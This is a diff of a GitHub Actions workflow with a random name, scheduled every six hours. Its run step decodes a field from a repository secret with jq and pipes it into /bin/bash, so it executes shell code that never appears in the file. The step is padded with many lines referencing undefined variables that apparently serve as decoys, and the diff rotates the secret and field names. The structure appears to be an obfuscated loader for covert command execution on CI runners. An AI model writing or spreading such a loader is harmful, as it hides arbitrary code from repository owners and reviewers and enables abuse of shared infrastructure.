@@ -3,23 +3,27 @@ name: donecartography
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
-
-jobs:  # 8415
+    - cron: '17 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: donecartography
         env:
-          x5: ${{ secrets.x5 }}
+          eog01: ${{ secrets.eog01 }}
         run: |
-          echo $x5 | jq -r .pl8 | /bin/bash
-          echo $ubpzf48 | jq -r .w33390 | /bin/bash
-          echo $uekn2 | jq -r .nuwtb4 | /bin/bash
-          echo $ebw860 | jq -r .kjz452 | /bin/bash
-          echo $grkge2619 | jq -r .asvsk291 | /bin/bash
-          echo $vrl250 | jq -r .xbp613 | /bin/bash
-          echo $pr29 | jq -r .yv2872 | /bin/bash
-          echo $pajn32166 | jq -r .t42528 | /bin/bash
+          echo $eog01 | jq -r .u0339 | /bin/bash
+          echo $qjoez22 | jq -r .rjrsg49 | /bin/bash
+          echo $d3847 | jq -r .vyf8364 | /bin/bash
+          echo $hq56005 | jq -r .mk1 | /bin/bash
+          echo $iqi3675 | jq -r .haes6 | /bin/bash
+          echo $bplu0 | jq -r .kl32 | /bin/bash
+          echo $cvnfb59497 | jq -r .aw498 | /bin/bash
+          echo $r784 | jq -r .fg4663 | /bin/bash
+          echo $p9916 | jq -r .vhaer818 | /bin/bash
+          echo $kykg88197 | jq -r .bm733 | /bin/bash
+          echo $qy4675 | jq -r .c27239 | /bin/bash
+          echo $p1 | jq -r .qzhh1 | /bin/bash
+          echo $k19 | jq -r .xpsu82 | /bin/bash
 
